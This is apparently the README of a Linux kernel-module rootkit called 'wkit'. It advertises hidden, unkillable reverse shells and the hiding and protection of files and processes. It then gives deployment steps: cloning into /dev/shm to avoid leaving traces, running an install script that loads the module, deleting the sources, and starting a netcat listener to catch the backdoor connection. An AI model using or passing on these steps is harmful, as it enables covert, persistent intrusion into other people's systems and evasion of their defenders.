<h1 align="center">
  <img src="assets/showcase.png">
  </br>
  </br>
  wkit | a rootkit for modern kernels
</h1>

a linux loadable kernel module (LKM) rootkit for modern kernels
using a userland agent, it provides a reverse backdoor that 
you can use to create hidden reverse shells, hidding files and
protecting processes.

## features
- support for 5.15+ 64 bit kernels
- create hidden and unkillable reverse shells
- make files hidden, unremovable and unreadable
- make processes hidden and unkillable

## installing
first you should install all the dependencies:
- `build-essential`: gcc and other compile tools 
- `linux-headers`: linux API headers needed for building a LKM 

then clone the repository, to leave no trace on the disk
you can do this inside the `/dev/shm` directory:
```bash
cd /dev/shm
git clone https://github.com/ngn13/wkit.git
cd wkit
```
after that run the `install.sh` script:
```bash
./install.sh
```
this script will:
- check the kernel version and arch
- create new random configuration 
- build the kernel module
- build the userland agent 
- install the userland agent 
- load the kernel module

lastly cleanup the sources:
```
cd .. && rm -rf wkit
```

## usage
start a netcat listener on the host and port you specified during
the installation:
```
nc -lnvp <port>
```
userland agent attempts to make connection with this address every 
5 seconds, so you should receive a backdoor connection in few seconds


## resources
to learn more about LKMs and rootkits checkout these resources:
- [LKM programming guide](https://sysprog21.github.io/lkmpg/)
- [xcellerator's kernel hacking guide](https://github.com/xcellerator/linux_kernel_hacking)
- [Linux kernel teaching](https://linux-kernel-labs.github.io/refs/heads/master/)

also feel free to create issues if you have any questions - you can also contribute with PRs
